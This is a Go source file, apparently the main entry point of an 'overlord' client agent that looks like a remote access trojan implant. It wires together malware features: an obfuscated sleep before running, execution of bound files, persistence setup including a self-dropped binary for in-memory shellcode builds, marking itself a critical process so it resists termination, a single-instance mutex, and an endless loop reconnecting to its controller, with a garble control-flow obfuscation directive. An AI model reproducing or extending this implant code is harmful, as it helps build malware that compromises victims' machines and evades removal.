package main

import (
	"log"
	"time"

	"overlord-client/cmd/agent/config"
	"overlord-client/cmd/agent/criticalproc"
	"overlord-client/cmd/agent/mutex"
	"overlord-client/cmd/agent/persistence"
)

func main() {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	cfg := config.Load()

	if cfg.SleepSeconds > 0 {
		sleepObfuscated(cfg.SleepSeconds)
	}

	runBoundFiles()

	if cfg.EnablePersistence {
		if isRunningInMemory() {
			if len(selfDropBinary) > 0 {
				if err := persistence.SetupFromBytes(selfDropBinary); err != nil {
					log.Printf("Warning: Failed to setup shellcode persistence: %v", err)
				}
			}
			// No selfDropBinary = shellcode built without persistence embed; skip.
		} else {
			if err := persistence.Setup(); err != nil {
				log.Printf("Warning: Failed to setup persistence: %v", err)
			}
		}
	}

	if cfg.CriticalProcess {
		criticalproc.Setup()
	}

	releaseMutex, ok, err := mutex.Acquire(cfg.Mutex)
	if err != nil {
		log.Printf("[mutex] failed to initialize mutex: %v", err)
		log.Printf("[mutex] continuing without mutex protection")
		releaseMutex = func() {}
		ok = true
	}
	if !ok {
		log.Printf("[mutex] another instance is already running; exiting")
		return
	}
	defer releaseMutex()
	mutex.SetGlobalRelease(releaseMutex)

	for {
		func() {
			defer recoverAndLog("main", nil)
			runClient(cfg)
		}()
		time.Sleep(2 * time.Second)
	}
}
